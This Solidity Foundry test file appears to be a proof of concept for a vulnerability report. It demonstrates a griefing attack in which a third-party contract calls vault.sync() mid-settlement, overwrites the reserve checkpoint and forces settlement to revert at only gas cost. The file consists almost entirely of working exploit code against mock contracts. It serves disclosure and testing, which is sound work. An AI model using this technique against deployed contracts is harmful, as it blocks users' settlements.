// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

import {Vault} from "../../src/Vault.sol";
import {IVault} from "../../src/interfaces/IVault.sol";
import {ILockCallback} from "../../src/interfaces/ILockCallback.sol";
import {Currency} from "../../src/types/Currency.sol";

// Minimal ERC20
contract MockERC20 {
    string public name = "T";
    string public symbol = "T";
    uint8  public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// Attacker: calls vault.sync() to overwrite the reserve checkpoint
contract Griefer {
    IVault public vault;

    constructor(IVault _vault) { vault = _vault; }

    function attack(Currency currency) external {
        vault.sync(currency);
    }
}

// Simulates a legitimate pool manager performing a settlement
contract FakePoolManager is ILockCallback {
    IVault    public vault;
    MockERC20 public token;
    Currency  public currency;

    address public user;
    address public griefContract;
    bool    public enableAttack;
    uint256 public paid;

    constructor(IVault _vault, MockERC20 _token) {
        vault    = _vault;
        token    = _token;
        currency = Currency.wrap(address(_token));
    }

    function setAttack(address _griefer) external {
        griefContract = _griefer;
        enableAttack  = true;
    }

    function execute(uint256 amount) external {
        user = msg.sender;
        vault.lock(abi.encode(amount));
    }

    function lockAcquired(bytes calldata data) external override returns (bytes memory) {
        uint256 amount = abi.decode(data, (uint256));

        // Register that user owes tokens (negative delta = user must pay)
        vault.accountAppBalanceDelta(currency, -int128(int256(amount)), user);

        // Checkpoint current vault balance
        vault.sync(currency);

        // User sends tokens into vault
        token.transferFrom(user, address(vault), amount);

        // Attacker overwrites the checkpoint here (between transfer and settle)
        if (enableAttack) {
            Griefer(griefContract).attack(currency);
        }

        // settle() returns 0 when griefed, leaving delta unresolved
        paid = vault.settleFor(user);

        return "";
    }
}

contract SyncGriefingPoC is Test {

    Vault           public vault;
    MockERC20       public token;
    FakePoolManager public pm;
    Griefer         public attacker;
    Currency        public currency;

    address user = address(0xBEEF);
    uint256 constant AMOUNT = 100 ether;

    function setUp() public {
        vault    = new Vault();
        token    = new MockERC20();
        currency = Currency.wrap(address(token));
        pm       = new FakePoolManager(vault, token);
        attacker = new Griefer(vault);

        vault.registerApp(address(pm));

        token.mint(user, 1000 ether);
        vm.prank(user);
        token.approve(address(pm), type(uint256).max);
    }

    // Baseline: normal settlement succeeds without attack
    function test_1_normal_settlement() public {
        vm.prank(user);
        pm.execute(AMOUNT);

        uint256 paid = pm.paid();
        console.log("Paid (no attack):", paid);
        assertEq(paid, AMOUNT, "Full amount should be settled");
    }

    // Attack: griefer calls sync() after transfer, settle() returns 0, lock reverts
    function test_2_sync_grief_causes_revert() public {
        pm.setAttack(address(attacker));

        vm.prank(user);
        vm.expectRevert(IVault.CurrencyNotSettled.selector);
        pm.execute(AMOUNT);

        console.log("PASS: lock reverted with CurrencyNotSettled");
        console.log("PASS: attacker used zero tokens and zero permissions");
    }

    // Mechanism: sync() overwrites reservesBefore, making paid = 0
    function test_3_reserve_overwrite_mechanism() public {
        token.mint(address(vault), 50 ether);
        vault.sync(currency);

        (, uint256 res1) = vault.getVaultReserve();
        console.log("After victim sync:  reservesBefore =", res1);
        assertEq(res1, 50 ether);

        token.mint(address(this), 100 ether);
        token.transfer(address(vault), 100 ether);

        vault.sync(currency);
        (, uint256 res2) = vault.getVaultReserve();
        console.log("After griefer sync: reservesBefore =", res2);
        assertEq(res2, 150 ether);

        uint256 wouldBePaid = token.balanceOf(address(vault)) - res2;
        console.log("settle() would compute paid =", wouldBePaid);
        assertEq(wouldBePaid, 0);
    }

    // Cost: attacker needs only gas, no tokens, no registered role
    function test_4_attacker_cost_only_gas() public {
        assertEq(token.balanceOf(address(attacker)), 0);
        assertFalse(vault.isAppRegistered(address(attacker)));

        attacker.attack(currency);

        console.log("PASS: vault.sync() callable with no tokens or role");
    }
}
